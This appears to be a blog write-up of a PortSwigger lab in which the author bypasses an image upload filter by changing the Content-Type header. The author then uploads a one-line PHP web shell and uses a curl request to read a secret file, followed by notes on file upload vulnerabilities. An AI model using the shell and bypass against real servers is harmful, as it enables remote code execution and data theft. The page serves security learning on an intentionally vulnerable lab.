<!DOCTYPE html>
<html lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
<title>1f2 - Web shell upload via Content-Type restriction bypass \[Portswigger Lab] :: user@cybrealm:~$</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="description" content="This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.
To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret.
You can log in to your own account using the following credentials: wiener:peter
Solution: So upon logging in my account, I can see the avatar upload field.
" />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f2-web-shell-upload-via-content-type-restriction-bypass-portswigger-lab/" />
<meta property="og:locale" content="en" />
<meta property="og:title" content="1f2 - Web shell upload via Content-Type restriction bypass \[Portswigger Lab] :: user@cybrealm:~$" />
<meta property="og:description" content="This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.
To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret.
You can log in to your own account using the following credentials: wiener:peter
Solution: So upon logging in my account, I can see the avatar upload field.
" />
  <meta property="og:type" content="article" />
    <meta property="article:published_time" content="2024-07-06 00:00:00 &#43;0000 UTC" />
    <meta property="article:modified_time" content="2024-07-06 00:00:00 UTC" />
  <meta property="article:author" content="user@cybrealm:~$" />
<meta property="og:url" content="http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f2-web-shell-upload-via-content-type-restriction-bypass-portswigger-lab/" />
<meta property="og:site_name" content="user@cybrealm:~$" />
<meta property="og:image" content="" />
<meta property="og:image:width" content="2048" />
<meta property="og:image:height" content="1024" />
<link rel="shortcut icon" href="" />
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
  href="https://fonts.googleapis.com/css2?family=Fira+Sans:ital,wght@0,300;0,400;0,500;1,300;1,400;1,500&family=Roboto+Slab:wght@300;400;500&family=Ubuntu+Mono:ital@0;1&display=swap"
  rel="stylesheet"
/>
<link href="/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f2-web-shell-upload-via-content-type-restriction-bypass-portswigger-lab/" rel="alternate" type="application/rss+xml" title="user@cybrealm:~$" />
<link rel="stylesheet" href="http://localhost:1313/styles.css" />
</head>

  <body>
    <div class="theme-container">
      <div class="container center">
        <header class="site-header">
<nav class="navbar">
  <div class="navbar__first">
    <ul class="navbar__list borders">
      <li><a href="http://localhost:1313/">Home</a></li>
      <li>
        <button class="theme-toggle transparent"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>
</button>
      </li>
    </ul>
  </div>
  <div class="navbar__separator"></div>
</nav>
</header>
        <main class="site-main"><article class="post">
    <header class="post-header">
        <h1 class="post-title"><a href="http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f2-web-shell-upload-via-content-type-restriction-bypass-portswigger-lab/">1f2 - Web shell upload via Content-Type restriction bypass [Portswigger Lab]</a></h1>
        <div class="post-meta">
            <time pubdate datetime="2024-07-06 00:00:00 UTC">
              Published on
              2024-07-06 00:00:00 UTC
            </time>
            <time pubdate datetime="2024-07-06 00:00:00 UTC"> last modified 2024-07-06 00:00:00 UTC. </time>
        </div>
    </header>
      <div class="post-content">
        <p>This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.</p>
<p>To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file <code>/home/carlos/secret</code>. Submit this secret.</p>
<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>

<h3 id="solution">
  Solution:
  <a href="#solution" class="hanchor" ariaLabel="Anchor"></a>
</h3>
<p>So upon logging in my account, I can see the avatar upload field.</p>

  <figure class="left">
    <img src="/.gitbook/assets/Pasted%20image%2020240719144326.png"   />
  </figure>

<p>Testing this functionality by uploading an empty <code>test.txt</code> file gives me an error</p>
<p><code>Sorry, file type text/plain is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.</code></p>
<p>The next thing I tried was to upload the same file but modify the HTTP request using burpsuite and change <code>Content-Type: Text/Plain</code> to <code>Content-Type: image/jpeg</code>. This bypassed a defense mechanism and as a result it let me upload a text file</p>

  <figure class="left">
    <img src="/.gitbook/assets/Pasted%20image%2020240719145007.png"   />
  </figure>

<p>Now it&rsquo;s time to upload a web shell <code>mal.php</code> with the following contents:</p>
<p><code>&lt;?php echo system($_GET['command']); ?&gt;</code></p>

  <figure class="left">
    <img src="/.gitbook/assets/Pasted%20image%2020240719145330.png"   />
  </figure>

<p>Now, since I know that this <code>mal.php</code> is uploaded in <code>/files/avatars/mal.php</code>, I can call it using CURL.</p>
<p>And we got the secret</p>

<div class="highlight-wrapper">
  <div class="highlight-toolbar">
    <span class="item">
      <span class="label">Lang:</span>
      <span class="name"></span>
    </span>


    <button class="item right outline brighter hide js-btn-copy-code">Copy</button>
  </div><pre tabindex="0"><code>curl -X GET &#34;https://0a2200b703596e51800635e70004004c.web-security-academy.net/files/avatars/mal.php?command=cat%20../../../../home/carlos/secret&#34;

7nJBS****************************7nJBS****************************</code></pre></div>
<p>remember that calls form curl like this repeats the response twice, so I had to remove the double of this output.</p>
<p>The secret contents: <code>7nJB****************************</code></p>
<hr>
<p><strong>Impact of FUVs generally depend on two key factors</strong>:</p>
<ul>
<li>Which aspect of the file the website fails to validate properly, whether its the size, type, contents&hellip;</li>
<li>what restrictions are imposed once file is uploaded</li>
</ul>
<p>In the worst case scenario, the file is not validated at all and the server configuration allows certain types to run as code - potentially giving an attacker web shell and full access to a webserver.</p>
<p>In case filename isn&rsquo;t validated properly, an attacker might just replace original file with a malicious one.</p>
<p>Failing to validate file size might also enable an attacker to perform a DoS.</p>
<p><em><strong>How Web servers handle static file requests?</strong></em></p>
<p>Generally, static files on a website can be mapped 1:1 with a filesystem hierarchy.</p>
<p>Nowadays modern applications are dynamic and hence complex. Path of a request may not necessarily represent a filesystem entirely. Nowadays, web servers still deal with static requests for some static files like stylesheets, images etc.</p>
<p>The process for handling such files is historically largely the same. - The server parses the path in the request to identify the file extension. Then uses this information to determine the filetype by comparing it to preconfigured mapping between extensions and MIME types.</p>
<ul>
<li>if the file is non-executable like HTML file, it may just send the file in the HTTP response</li>
<li>if the file is executable like PHP or PYTHON and the server is configured to execute these files, it will assign variables based on the headers and parameters in the HTTP request before executing it. The result may be passed on to HTTP response after.</li>
<li>if the file is executable, but the server is not configured to run them, it will generally respond with an error or in some cases, just send back the plain text representation of the code to the client. such misconfigurations may lead to code and sensitive data leakage. The <code>Content-Type</code> response header may provide clues as to what kind of file the server thinks it has served.</li>
</ul>
<p>As a precaution, servers generally only run scripts whose filetypes have been explicitly defined to execute. Otherwise they may return an error message or plaintext of source code. In such cases, it might only be possible to leak the source but won&rsquo;t be able to deploy a webshell.</p>
<p>This kind of configuration will have a strict policy for directories where user can upload files than other locations on the filesystem that are assumed to be out of reach from users. If you can find a directory where user-uploaded files are not supposed to be, the code might execute.</p>
<p>Web servers often use the <code>filename</code> field in <code>multipart/form-data</code> requests to determine the name and location where the file should be saved.</p>

      </div>


    <footer class="post-footer">
    </footer>
  </article>
        </main>
        <footer class="site-footer">
<p class="buildinfo">
  <time datetime="2025-11-27 22:10:46 &#43;04">Site built on: 2025-11-27 22:10:46 &#43;04</time>
</p>
<div class="copyright">
  <p></p>
  <nav class="navbar">
    <ul class="navbar__list">
      <li><a href="http://localhost:1313/posts/index.xml">RSS</a></li>
      <li><a href="http://localhost:1313/sitemap.xml">Sitemap</a></li>
    </ul>
  </nav>
</div>
<p class="themeinfo">Powered by <a href="https://gohugo.io">Hugo</a>, using theme <a href="https://manid2.github.io/hugo-xterm/">Hugo Xterm</a>.</p>
</footer>
      </div>
    </div><script type="text/javascript" src="/bundle.js"></script>
</body>
</html>
